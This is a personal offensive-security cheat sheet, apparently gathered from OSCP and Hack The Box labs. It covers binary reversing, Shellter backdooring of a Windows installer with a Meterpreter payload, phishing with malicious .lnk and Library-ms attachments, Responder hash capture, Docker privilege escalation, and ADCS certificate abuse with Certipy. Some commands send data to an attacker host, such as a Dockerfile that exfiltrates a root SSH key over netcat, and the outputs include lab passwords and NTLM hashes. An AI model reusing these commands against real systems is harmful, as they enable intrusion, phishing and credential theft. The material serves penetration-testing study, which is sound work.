sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==               # Yaml Signaturebypass to get RCE - swap out the examplke chekcsums for generatedone
releaseDate: '2019-11-20T11:17:02.627Z'                                                # Yaml Signaturebypass to get RCE - format the release date correctly 
```

----

# Reverseing 

## Binary investigation - First steps
Lets say you have a binary called `SuperBinary`. Things ot try:
- try a ton of a's `AAAAAAAAAAAAAA` as input (like 200 to crash to for buffer overflow)
- `strings SuperBinary` try strings on it to see what its got written and search around 
- `strings -e l SuperBinary` try strings with a differnt encodeing method 
- `strings -e s SuperBinary` # single-7-bit-byte characters (ASCII, ISO 8859, etc., default), 
- `strings -e S SuperBinary` # single-8-bit-byte characters, 
- `strings -e b SuperBinary` # 16-bit bigendian, 
- `strings -e 1 SuperBinary` # 16-bit littleendian, 
- `strings -e B SuperBinary` # 32-bit bigendian, 
- `strings -e L SuperBinary` # 32-bit littleendian. Useful for finding wide character strings. (l and b apply to, for example, Unicode UTF-16/UCS-2
- `strings -e l ResetPassword.exe`       # Offsec Nagoya


Try and understand what the binary was compiled with; eg PyInstaller , which means we can use a tool such as [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to extract its contents

This site worked but is dodge - https://ctfever.uniiem.com/en/tools/pyc-decompiler FIND ANOTHER WAY 

### .NET revereseing 

```
K:> ilspycmd ResetPassword.exe -p -o Binary-Decompilation-OP/         # Decompile and reverse a .NET binary (offsec Nagoya)
```
K:> strings -e l ResetPassword.exe      # Decompile and reverse a .NET binary (offsec Nagoya) - This also  worked - (de)encoded in 8 bit

```
dotnet tool install --global ilspycmd                                 # Decompile and reverse a .NET binary (offsec Nagoya) - Install the tool if not availible
```

```
donet --version                                                       # Decompile and reverse a .NET binary (offsec Nagoya) - Troubleshoot install - SEE IN BROWSER
Check the currrent .NET version
```

```
sudo apt remove dotnet-sdk-<VERSION>
```

Install new version - eg version 8
```
wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update
sudo apt install -y dotnet-sdk-8.0
```




This tool https://github.com/dnSpy/dnSpy?tab=readme-ov-file is good for primarily used for debugging and editing .NET assemblies.  Shows more than than strings . Used in Offsec Nagoya



### Ghidra

After You have dragged the binary into a new project, you go to the annalyst tab , make option changes and run the analyser. 

See ther esults in the central "Listing Windows". this contains , diassemble listing , data and even images. Clickning functions her will update other windows. Ad the Show oever view to see some colours on the side.

On the right hanbd side you can see the decompile Windows which will show the source code decompiled of a fucntion.
ON the left hand you will see Program tree window, which contains the different sections from the ninary , eg  the bSS and data segment . 
Underneath that the Symbole Tree, Underneath that we see the data types window
At the bottom of the window is the console windows whishc OP the results of scripts etc

Another important window is the Bytes Windows ( Hex Dump window) To exporwe the binary as hex. Good to enable the asscii view by clicking on the small wrench.

Look for main and that will show you what its doing "mainly"
search for strings `search>For stings ...`
- Search for juicy strings
- Search for where it asked for inout data (eg password) and then click on the finding. it will take you too that part of the code.


TODO : PAth Hijack, path injection on ippsec.rocks


## Shellter ( windows PE injection )

[Shellter](https://www.shellterproject.com/) 

#### To set up 
Install wine, Shellter and a compatibility layer capable of running win32 applications on several POSIX-compliant operating systems.
```
sudo apt install wine
sudo apt install shellter
dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32
```

```
# run with ...

shellter 
...
Choose Operation Mode - Auto/Manual (A/M/H): A
...
PE Target: /home/hacker/Downloads/SpotifySetup.exe
...
Enable Stealth Mode? (Y/N/H): Y
...
[1] Meterpreter_Reverse_TCP   [stager]
[2] Meterpreter_Reverse_HTTP  [stager]
...
Use a listed payload or custom? (L/C/H): L                                                                                  
Select payload by index: 1    
```
The above will have edited your windows PE in situ with the payload




#### Python Binary exstraction
 https://github.com/extremecoders-re/pyinstxtractor

```
┌──(kali㉿kali)-[~/Documents/REVERSING/SOCKET-HTB/app]
└─$ python3 pyinstxtractor/pyinstxtractor.py qreader 
[+] Processing qreader
[+] Pyinstaller version: 2.1+
[+] Python version: 3.10
[+] Length of package: 108535118 bytes
[+] Found 305 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_subprocess.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_pyqt5.pyc
[+] Possible entry point: pyi_rth_setuptools.pyc
[+] Possible entry point: pyi_rth_pkgres.pyc
[+] Possible entry point: qreader.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.10 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: qreader

You can now use a python decompiler on the pyc files within the extracted directory
                                                                                          
```

The tool has extracted .pyc files, which are compiled bytecode files that are generated by the Python interpreter when a .py file is imported. We can now use a decompiler such as [unpyc3](https://github.com/greyblue9/unpyc37-3.10) to turn the .pyc files into Python source code

### exifttool
`exifttool` # revels meta data on any file eg;  the email of creator
- `exiftool -a -u brochure.pdf`
`-a` to display duplicated tags and `-u` to display unknown tags

```
exiftool -a -u *.pdf  | grep Creator | cut -d ":" -f 2 | cut -d " " -f 2 | tee usernames.txt            # exift tools Get the usernames
```

## Phishing

###### Windows Phishing email via config.Library-ms and malicious lnk files with webdav (best see client side notes)

Tool for createing malicious lnk files files - https://github.com/xct/hashgrab                                  - phishing and .lnk files 
NOTE: maybe this is a better tool that then above - Maybe better tool : https://github.com/Greenwolf/ntlm_theft    - phishing and .lnk files


```sh
└─$ python3 hashgrab.py 192.168.179.156 TotalLegit        # malicious lnk type files files 
[*] Generating hash grabbing files..
[*] Written @TotalLegit.scf
[*] Written @TotalLegit.url
[*] Written TotalLegit.library-ms
[*] Written desktop.ini
[*] Written lnk_268.ico
[+] Done, upload files to smb share and capture hashes with smbserver.py/responder
```




```
Prepare the Windows Library and shortcut files to download powercat and send back a reverse shell . Best done on a windows machine , perhaps on vscode . 
pip3 install wsgidav                                 # Phishing email - install wsgidav locally
mkdir /home/hacker/webdav                            # Phishing email -
mv config.Library-ms Maicious.lnk  /home/hacker/webdav  # Phishing email - 
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/hacker/webdav   # Phishing email - set up a WebDAV server,
Test webdav server by visiting http://127..1:80      # Phishing email -
python3 -m http.server 8000                          # Phishing email - Web server for powercat
nc -lvnp 4444                                        # Phishing email - Reverse listener listener,

```
### Swaks ( Swiss Army Knife SNTP )
Send an email with multiple attachments ( OSCP Client Side attacks Capstone)
`--suppress-data` will quieten the terminal, good when sending attachments
`-ap` - Auth password

`swaks --to dave.wizard@supermagicorg.com --from test@supermagicorg.com --server 192.168.179.199 --auth-user test@supermagicorg.com --header "Subject: Click this" --body "This is a test email sent from the target machine." --attach @config.Library-ms --attach @automatic_configuration.lnk --attach @body.txt --suppress-data -ap`


Send a malicious email - simple 
```
swaks --to itsupport@outdated.htb --from "0xdf@0xdf.htb" --header "Subject: Internal web app" --body "http://10.10.14.6/msdt.html"      # Send a malicious email - simple 
```

## Send email with sendemail too

offsec Heptet 

```
sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.179.140:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a bomb.ods
sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s <VICTIM_IP>>:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a bomb.ods
```

### Gophish (phishing)
https://github.com/gophish/gophish - GoPhish is a Phishing Toolkit maintained by @jordan-wright, and will be used to deliver the
payload.



### Responder
A powerful LLMNR/NBNS/MDNS spoofing tool that captures NTLMv2 hashes and credentials via rogue SMB and HTTP services
The best tools for callbacks (especially from windows) is [Responder](https://github.com/lgandx/Responder), this will parse the packets properly for things like the password you are looking.
- `sudo responder -I tun0 -wv`
- `sudo responder -I eth0 -dwFP -v`

- `sudo responder -I tun0 -wF -d -v              # -wF: is good if you're trying to catch clients that auto-fetch wpad.dat.`
- `sudo responder -I tun0 -PF -d -v              # -PF: is more aggressive; it triggers NTLM even without WPAD by impersonating a proxy directly.`



### Pretender
A stealthy name resolution and DHCPv6 spoofing tool designed for advanced network manipulation and Kerberos relay setups without directly capturing credentials. [PRetender](https://github.com/RedTeamPentesting/pretender)
```
sudo ./pretender -i eth0 --ipv4 $(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}') --ipv6 $(ip -6 addr show eth0 | grep -oP '(?<=inet6\s)[\da-f:]+') --ttl 120s --router-lifetime 300s --lease-lifetime 300s --ra-period 120s --verbose   
```


### Inveigh

[Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions. 


```
Import-Module .\Inveigh.ps1
```

```
(Get-Command Invoke-Inveigh).Parameters
```

```
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the (Better) C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. 

We can also see the message Press ESC to enter/exit interactive console, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.

```
PS:> GET NTLMV2USERNAMES
PS:> GET NTLMV2UNIQUE
```

### Empire 
https://github.com/EmpireProject/Empire - might be out of date mnow and mainteined elsewhere
The Empire post exploitation project is developed by @harmj0y, @sixdub, @enigma0x3, rvrsh3ll,
@killswitch_gui, and @xorrior, and is a good choice for generating the malicious .hta and
receiving the callback.


### Asset finder 
Passive OSINT search for domains 
`go install github.com/tomnomnom/assetfinder@latest`
`assetfinder --subs-only <DOMOAIN>`

### httprobe
Similar to whatweb.
`go install github.com/tomnomnom/httprobe@latest`

### tee
Splits the input , 1 to a file and 1 to the screen.
This will create a file of all the hosts which are up.
as per `cat domains.txt | httprobe | tee hostsUp.txt`
`tee -a` will append to the file.

### meg 
- `go install github.com/tomnomnom/meg@latest`
"fetch many paths for many hosts; fetching one path for all hosts before moving on to the next path and repeating."

Verbose mode , looking for the web root `/` , with a delay of 1 sec. hosts file needs to be called `hosts`.
- `meg -d 1000 -v /`

`TurboIntruder` is mega fast.

`grep -Hnri <TERM> *` , where...
- `H` = file name
- `n` = Line number
- `r` = recursive 
- `i` = case insensitive

`grep -Hnri wifi * | vim -` 
This will pipe it into a vim buffer which you could save/search/modify etc.


   
## Docker 
- `docker run --rm -v $(pwd):/data kalilinux/kali-rolling bash -c "apt update -y && apt install -y nmap && nmap -T5 lazbmx1mui5u0fi9spfaumrojfp6d11q.oastify.com -oA /data/output.txt"`

## Docker Privesc
Making use of a Linux image, preferably Alpine Linux as it is a lightweight Linux distribution. 
This Linux image can then be imported into docker and then we can mount the **host file system** with root privileges **onto the container file system** .
- `docker run -it -v /:/mnt alpine`
  - `-it` Interacgive terminal 
  - `-v /:/mnt` mount the hosts `/` to `/mnt` on the container
- then run `chroot .` in the `/mnt` dir which will set the containers host file system to that of the host file system


## SUDO on docker to build and see images Dockerfile 

If we see something like these in `SUDO -l`
```
/usr/bin/docker images
/usr/bin/docker build *
```
We could build a nasty image to get back a the root ssh key 
```
FROM alpine

COPY id_rsa.bak /var/tmp/id_rsa
RUN nc -w 3 192.168.45.157 9001 < /var/tmp/id_rsa
```

The above `Dockerfile` build a new image based off of the alpine image. When we build the new image, the `id_rsa.bak` file will be copied into it and then the contents will be piped out to a listener waiting on our kali machine.

```
nc -nlvp 9001
```

```
sudo docker build -f /opt/Dockerfile /opt/
```


### Talk out of the docker container to the real worl, ( I think ) 
The hostname `host.docker.internal` is a special DNS name used within Docker containers to connect to services running on the Docker host. This is particularly useful for developers working on Docker for Mac and Docker for Windows, as it provides a way for containers to communicate with the host machine over the loopback network interface.

Here's how `host.docker.internal` works on different platforms:

Docker for Mac and Windows:
Docker for Mac: It resolves to the internal IP address used by the host, making it possible for the containers to connect to services running on the host machine.
Docker for Windows: Similar to Docker for Mac, it resolves to the internal IP address used by the host.
Docker for Linux:
As of my last update in September 2021, Linux doesn't natively support `host.docker.internal`. However, there are workarounds like manually adding a host entry to point to the host's external IP address or using a gateway IP.
Typical Uses:
Connecting to a database running on your local machine but not within a Docker container.
Connecting to any service which is running on the host but not inside a container.
Example:
Suppose you're running a web server on your local machine on port 8080 and you have a Docker container that needs to connect to this web server. Inside the Docker container, you could connect to http://host.docker.interna`:8080.

Note:
Using `host.docker.internal` bypasses any Docker networking isolation; it essentially allows the container to access the host's network. This is something to consider from a security perspective, particularly in production environments.

It's a handy feature for development and testing but use it carefully, keeping network security considerations in mind.


## Docker container escape

To go from a docker container to the host its best to first spawn an interactive shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh docker@172.17.0.1
```

Also If the config on the docker container reveals the ip address of 172.17.0.2.

When you encounter a container with the IP address 172.17.0.2, it usually indicates that this is the first container connected to the default Docker bridge network. By convention, the first IP address in a network segment is often reserved for the gateway of that network, which in this case is the Docker host's bridge interface. Therefore, if the container's IP is 172.17.0.2, the Docker host's bridge interface (often named docker0 on the host) usually has the IP address 172.17.0.1.

This setup allows the container to communicate with the host using the host’s IP address as a gateway. This is why, if the container has the IP address 172.17.0.2, it implies that the Docker host VM likely has the IP address 172.17.0.1, enabling network communications between the container and the host.

---

### Python venv (virtual enviroment)
`python3 -m venv .MY-VENV-PROJECT-DIR`
This command is used to create a virtual environment for Python projects. Here's what it does step by step:
python3 specifies that you're using Python 3 to execute the command.
- `-m venv` tells Python to use the `venv` module
- `.MY-VENV-PROJECT-DIR` is the name and location where the virtual environment will be created. 
Using a virtual environment helps maintain a clean, controlled, and consistent development or testing environment that matches the specific needs of each challenge or task.


Made a script to lauch and tear down python virtuals enviroments - py-venv.sh

```
# pyhton virtual enviroment venv py-venv
py-venv                               # alisfor pyhton virtual enviroment venv py-venv
source HACK-ENV/bin/activate          # activate pyhton virtual enviroment venv py-venv
pip install numpy pandas flask        # install multiple packages pyhton virtual enviroment venv py-venv
pip install -r requirements.txt       # install many package pyhton virtual enviroment venv py-venv
deactivate                            # deactivate pyhton virtual enviroment venv py-venv
```


---

#### Python exploit env

```
python3 -m venv exploit-env       # pyhton virtual enviroment venv
source exploit-env/bin/activate   # pyhton virtual enviroment venv
pip install -r requirements.txt   # pyhton virtual enviroment venv
deactivate                        # pyhton virtual enviroment venv
```




### Ansible Vault

```sh
ansible2john FILE1 FILE3 FILE3  > ansible.hashes   # all three hashes can go into 1 file (From HTB AUTHORITY)

# On his cracken
./hashcat.bin --username ansible.hashes rockyou.txt  # this works and starts cracking ????
./hashcat.bin --username ansible.hashes rockyou.txt --show   

# This gives us the ansible.vault password which we can use to decrypt each cred
cat file1 | ansible-vault decrypt
```

---

### Rubeus 

Below will **give us the cert AND the NTLM hash** . We could have also used the ticket with psexec.
- `.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap` 
Then
- `cme smb <IP_ADDRESS> -u administrator -H <NTLM_HASH_DATA>`
Then
- `psexec.py -hashes <LM_HASH>:<NTLM_HASH> USERNAME@IP_ADDRESS` or 
- `psexec.py -hashes <NTLM_HASH>:<NTLM_HASH> USERNAME@IP_ADDRESS` the hashes can both be NTLM_HASH. Ippsec think its juts a regex thing on psexec.











### Certipy
ADCS is best done from the box rather than from a windows attack machine hence **Certipy**.                                                                                            # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc


```sh
certipy-ad find -u <USERNAME> -p '<PASSWORD>' -target <DOMAIN-or-IP> -text -stdout -vulnerable                                                                                             # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc

-vulnerable           # Show only vulnerable certificate templates based on nested group memberships. Does not affect BloodHound output
-target               # DNS Name or IP Address of the target machine. Required for Kerberos or SSPI authentication
-text                 # Output result as text
-stdout               # Output result as text to stdout

certipy-ad find -u JODIE.SUMMERS -p 'hHO_S9gff7ehXw' -dc-ip nara-security.com  -dns-tcp -ns 192.168.179.30      
```

With the vuln template we are creating a new ticket which we can use to log in as the Alt name (eg the admin)
```certipy req -u <USERNAME> -p <PASSWORD> -upn <ALTERNATE_UserPrincipalName-eg-ADMIN> -target <DNS-or-IP> -ca <CA_NAME> -template <VULN_TEMPLATE>                                      # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc
```
Auth with a `.pfx` file 
```
certipy-ad auth -pfx administrator.pfx                                                                                                                                                  # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc  
```

<details>
	<summary>Example Output</summary>

```sh

┌──(kali㉿kali)-[~]
└─$ certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication -debug
certipy-ad v4.8.2 - by Oliver Lyak (ly4k)

[+] Trying to resolve 'sequel.htb' at '10.129.215.135'
[+] Trying to resolve 'SEQUEL.HTB' at '10.129.215.135'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:10.129.215.135[\pipe\cert]
[+] Connected to endpoint: ncacn_np:10.129.215.135[\pipe\cert]
[*] Successfully requested certificate
[*] Request ID is 15
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
                                                                                                                                                                                  
┌──(kali㉿kali)-[~]
└─$ certipy auth -pfx administrator.pfx                      
certipy-ad v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee


─$ certipy-ad find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -target authority.htb -text -stdout -vulnerable                                                                                 # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc
certipy-ad v4.7.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 13 enabled certificate templates
[!] Failed to resolve: authority.authority.htb
[*] Trying to get CA configuration for 'AUTHORITY-CA' via CSRA
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via CSRA: [Errno -2] Name or service not known
[*] Trying to get CA configuration for 'AUTHORITY-CA' via RRP
[!] Got error while trying to get CA configuration for 'AUTHORITY-CA' via RRP: [Errno Connection error (authority.authority.htb:445)] [Errno -2] Name or service not known
[!] Failed to get CA configuration for 'AUTHORITY-CA'
[!] Failed to resolve: authority.authority.htb
[!] Got error while trying to check for web enrollment: [Errno -2] Name or service not known
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : AUTHORITY-CA
    DNS Name                            : authority.authority.htb
    Certificate Subject                 : CN=AUTHORITY-CA, DC=authority, DC=htb
    Certificate Serial Number           : 2C4E1F3CA46BBDAF42A1DDE3EC33A6B4
    Certificate Validity Start          : 2023-04-24 01:46:26+00:00
    Certificate Validity End            : 2123-04-24 01:56:25+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
Certificate Templates
  0
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollmentCheckUserDsCertificate
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

</details>

We can also edit credential `.pfx` files like in openssl
To use pass the cert we need ot get the key out of the `administrator.pfx` file , which we can do with certipy
```
certipy-ad cert -pfx administrator.pfx -nocert -out administrator.key                                                                                                          # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc
```
we can do a similar thing to get just the cert 
```
certipy-ad cert -pfx administrator.pfx -nokey -out administrator.crt                                                                                                          #  Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc
```

Then we could se pass the cert - https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py

```
python3 ptc.py -action modify_user -crt administrator.crt -key administrator.key -domain "nara-security.com" -dc-ip 192.168.179.30 -target "tracy.white" -elevate     # Windows Privesc - if I have credentials try stuf with Certificates , Maybe some templates are misconfigured for privesc
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Granted user 'tracy.white' DCSYNC rights!

```

### ntpdate
- `sudo ntpdate <IP_ADDRESS_TO_SYNC_WITH>`
Sets the local date and time by polling the Network Time Protocol (NTP) servers specified to determine the correct time. If you get clock skew

---

# Misc tools yet to be reseach

https://github.com/frizb/PasswordDecrypts/blob/master/README.md
https://github.com/Hackplayers/
https://lolbas-project.github.io/#
https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip
https://github.com/ricmoo/pyaes

```
sudo apt install -y tldr     # summarises man pages with examples
```

# Source code Foo

`tree` is a good tool to look at a source code repo at a glance

## Hacking a git repo 

**Note!** Sometimes `git-dumper` doesnt get the repo first time and might need to be pulled again cleanly in a fresh terminal.
```
Pyvenv                                                                                # Hacking a git repo 0 - Create a Py V_env
pip install git-dumper                                                                # Hacking a git repo 1 - install gitdumper  - https://github.com/arthaud/git-dumper.git
git-dumper http://192.168.118.144/.git DUMPED_REPO                                    # Hacking a git repo 2 - get the repo
cd DUMPED_REPO                                                                        # Hacking a git repo 3 - go in the repo
git log  # or git reset --hard                                                        # Hacking a git repo 4 - gitdumper from a UI or web server  
git show                                                                              # Hacking a git repo 5 - Checks - see the details of all the current staged commits
git status                                                                            # Hacking a git repo 6 - Checks - see the status of the cwd
git log                                                                               # Hacking a git repo 7 - Checks - see the commit history
git show <HASH>                                                                       # Hacking a git repo 8 - Checks - see -the details of a spoecific commit

/home/kali/Tools/GitTools/Dumper/gitdumper.sh http://source.cereal.htb/.git/ source/  # Hacking a git repo - Alt tool to gitdumper
```

Retore files from git repo
```
# cd into repo fir                                                                    # Hacking a git repo Checks - Restoreing a file 
git show <COMMIT_HASH>:FILENAME > OUTFILENAME                                         # Hacking a git repo Checks - Restoreing a file
git show f82147bb0877fa6b5d8e80cf33da7b8f757d11dd:fetch_current.sh > fetch_current.sh # Hacking a git repo Checks - Restoreing a file
```

Clone a git repo with  a users tocken 0 HTB Lock - GitTea
```
git clone http://43ce39bb0bd6bc489284f2905f033ca467a6362f@10.129.168.165:3000/ellen.freeman/website.git
```



## gitLeaks

Find commit secrets leaked by running [gitleaks](https://github.com/gitleaks/gitleaks) **within** the source code repository as per:
- `gitleaks detect`                                                                   # Hacking a git repo Checks - initial
- `gitleaks detect -v -f json -r ../GitleaksReport.json`                              # Hacking a git repo Checks - comprehensive


```
python3 -m venv exploit-env                                                           # Hacking a git repo - pyhton virtual enviroment venv for gitdumper might be required
source exploit-env/bin/activate                                                       # Hacking a git repo - pyhton virtual enviroment venv for gitdumper might be required
pip install -r requirements.txt                                                       # Hacking a git repo - pyhton virtual enviroment venv for gitdumper might be required
deactivate                                                                            # Hacking a git repo - pyhton virtual enviroment venv for gitdumper might be required
```


## Git repo intel and recovery
Git Tools - https://github.com/internetwache/GitTools has git dumper for Git repo intel           - Hacking a git repo 
```
$ /home/kali/Tools/GitTools/Dumper/gitdumper.sh http://192.168.179.108/.git/ DUMPED-CLONE   # Git repo intel - Hacking a git repo 
$ cd DUMPED-CLONE                                                                           # Git repo intel - Hacking a git repo 
$ git checkout                                                                              # Git repo intel - Hacking a git repo  check what has changed based on the last commit. 
$ git status                                                                                # Git repo intel - Hacking a git repo check on the listed files, git status might show that all files have been staged for deletion but the deletion hasn't been committed yet.  
$ git checkout -- .                                                                         # Git repo intel - Hacking a git repo restore the files
```

`git checkout` : - used to switch branches or restore files in a Git repository.
`--`: signals to Git that what follows are file paths, not branch or commit names. It is a way to explicitly avoid ambiguity between files and branches.
`.` : . refers to the current directory and all its contents (recursively).

### svn  (Apache alternative to git)

```
K:> svn log --username admin --password admin http://<TARGET_IP>/svn/dev/               # svn (like git) - With creds see the logs of revisions
K:> svn diff -r 3:1 --username admin --password admin http://<TARGET_IP>/svn/dev/       # svn (like git) - Compare revision 3 with revision 1
```

## AI Improved Git repo interrogator - 1liner
`{ find .git/objects/pack/ -name "*.idx" | while read i; do git show-index < "$i" | awk '{print $2}'; done; find .git/objects/ -type f | grep -v '/pack/' | awk -F'/' '{print $(NF-1)$NF}';} | while read o; do git cat-file -p $o | grep -an SEARCH_TERM && echo "in object $o"; done`

It first finds all the `.idx` files under the `.git/objects/pack/` directory and prints out the object names (hashes) contained in these index files.
Then it finds all files under the `.git/objects/` directory excluding those under the `/pack/` subdirectory, and prints out their names as well.
All these object names are piped into git cat-file -p command to print the contents of these objects.
Finally, `grep -a SEARCH_TERM` is used to filter the output and print only lines containing the search term.
In order to list the files and line numbers where the "SEARCH_TERM" is found, we need to modify the command slightly:

## Git repo interrogator - 1liner
`{ find .git/objects/pack/ -name "*.idx" | while read i; do git show-index < "$i" | awk '{print $2}'; done; find .git/objects/ -type f | grep -v '/pack/' | awk -F'/' '{print $(NF-1)$NF}';} | while read o; do git cat-file -p $o;done | grep -a <TERM>`

```sh
#!/bin/bash
# pipe to "grep -a" which read binary files as text
{ 
    # find the idx files. idx files store where in the pack files the source code files are
    find .git/objects/pack/ -name "*.idx" |
    # send it to a var called "i"
    while read i; do 
        # take the name of the fie and input it into git-show index, and then get the 2nd colum of data ( the object hashes values)
        git show-index < "$i" | awk '{print $2}';  
    done;
    # find all the objects that haven't been packed
    find .git/objects/ -type f | grep -v '/pack/' |
    awk -F'/' '{print $(NF-1)$NF}';
    # pipe the output of the two commands (var o) in the curly braces to "while read"
} | while read o; do
    # ...and pretty print the content of each file with cat file
        git cat-file -p $o;done

```
### Search for "TERM" in all repos in this directory
`for d in $(pwd)/*/ ; do (cd "$d" && echo "Searching in $d" && git grep -n "TERM") done`

### Search by file type for "TERM" in all repos in this directory
`for d in $(pwd)/*/ ; do (cd "$d" && echo "Searching in $d" && git grep -n <TERM>  -- "*.json") done`

### GitHub Search Filters:
- **repo:**: Search in a specific repository.
- **org:**: Search within an organization.
- **user:**: Search within a user’s repositories.
- **filename:**: Search for files with a specific name.
- **extension:**: Search for files with a specific extension.
- **path:**: Search within a directory path.
- **size:**: Search by file size.
- **stars:**: Search by repository stars.
- **fork:**: Include/exclude forked repositories.
- **language:**: Search by programming language.
- **topic:**: Search by repository topics.
- **is:**: Search by state (open/closed).
- **label:**: Search by issue/PR label.
- **author:**: Search by issue/PR author.
- **assignee:**: Search by issue/PR assignee.
- **mentions:**: Search issues/PRs mentioning user.
- **commenter:**: Search by issue/PR commenter.
- **in:**: Search within title, body, or comments.
- **created:**: Search by creation date.
- **pushed:**: Search by push date.
- **updated:**: Search by update date.
- **type:**: Search by type (issue, PR).

### Shodan Search Filters:
- **hostname:**: Filter by hostname.
- **net:**: Filter by IP or CIDR.
- **port:**: Filter by open port.
- **os:**: Filter by operating system.
- **country:**: Filter by country code.
- **city:**: Filter by city name.
- **geo:**: Filter by geographic coordinates.
- **after:**: Filter by date after.
- **before:**: Filter by date before.
- **org:**: Filter by organization name.
- **isp:**: Filter by ISP name.
- **product:**: Filter by product name.
- **version:**: Filter by version number.
- **title:**: Filter by page title.
- **html:**: Filter by HTML content.
- **ssl:**: Filter by SSL details.
- **vuln:**: Filter by vulnerability.
- **tag:**: Filter by specific tags.
- **device:**: Filter by device type.

---

### Wayback urls
`go install github.com/tomnomnom/waybackurls@latest`
Usage:
- `echo bbc.com | waybackurls > bbc-Domains.txt`

### Unfurl
`go install github.com/tomnomnom/unfurl@latest`
Pulls out params and more from urls to make lists whihc can be used in fuzzing . and probably much more,

-----


### Codingo Reconoitre Tool 
- https://github.com/codingo/Reconnoitre
